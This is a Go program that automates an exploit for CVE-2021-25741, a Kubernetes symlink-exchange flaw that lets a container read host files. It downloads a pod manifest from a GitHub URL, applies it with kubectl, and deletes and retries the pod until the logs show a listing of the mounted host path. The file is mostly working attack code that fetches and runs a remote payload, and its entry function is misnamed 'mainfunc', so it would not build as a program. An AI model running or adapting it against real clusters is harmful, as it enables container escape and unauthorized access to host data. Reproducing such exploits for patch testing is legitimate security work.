package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// podYAMLURL contains the URL for the Kubernetes Pod YAML
const podYAMLURL = "https://raw.githubusercontent.com/jerrybowang/CVE-2021-25741/main/pod.yaml"

// runScript simulates the behavior of your run.sh script
func runScript() error {
	for {
		// Get the Pod YAML content from the provided URL
		podYAMLContent, err := downloadFile(podYAMLURL)
		if err != nil {
			return fmt.Errorf("Error downloading Pod YAML: %v", err)
		}

		// Apply the Pod YAML
		cmdApply := exec.Command("kubectl", "apply", "-f", "-")
		cmdApply.Stdin = strings.NewReader(podYAMLContent)
		if err := cmdApply.Run(); err != nil {
			return fmt.Errorf("Error applying Pod YAML: %v", err)
		}

		time.Sleep(10 * time.Second) // You can change the sleep duration as needed

		// Get logs from the Pod
		cmdLogs := exec.Command("kubectl", "logs", "cve202125741", "mount-container")
		logs, err := cmdLogs.CombinedOutput()
		if err != nil {
			fmt.Println("Error getting logs:", err)

			// Treat the error as a "Bad attempt" and try one more time
			fmt.Println("Bad attempt. Trying one more time.")
			// Delete the Pod YAML in case of failure
			cmdDelete := exec.Command("kubectl", "delete", "-f", "-")
			cmdDelete.Stdin = strings.NewReader(podYAMLContent)
			cmdDelete.Run()

			// Wait for a short duration before retrying
			time.Sleep(5 * time.Second)

			continue
		}

		// Join multiple lines into a single line
		logsOneLine := strings.Join(strings.Fields(string(logs)), " ")

		if logsOneLine == "" {
			fmt.Println("Bad attempt. Trying one more time.")
			// Delete the Pod YAML in case of failure
			cmdDelete := exec.Command("kubectl", "delete", "-f", "-")
			cmdDelete.Stdin = strings.NewReader(podYAMLContent)
			cmdDelete.Run()
		} else {
			// Print the logs on a single line
			fmt.Println("ls /mnt/data output:")
			fmt.Println(logsOneLine)
			fmt.Println("Success!")
			return nil
		}
	}
}

// downloadFile downloads a file from the given URL
func downloadFile(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func mainfunc() {
	fmt.Println("Start executing the auto script, please wait")

	// Run the script
	if err := runScript(); err != nil {
		fmt.Println("Script execution failed:", err)
		return
	}
}
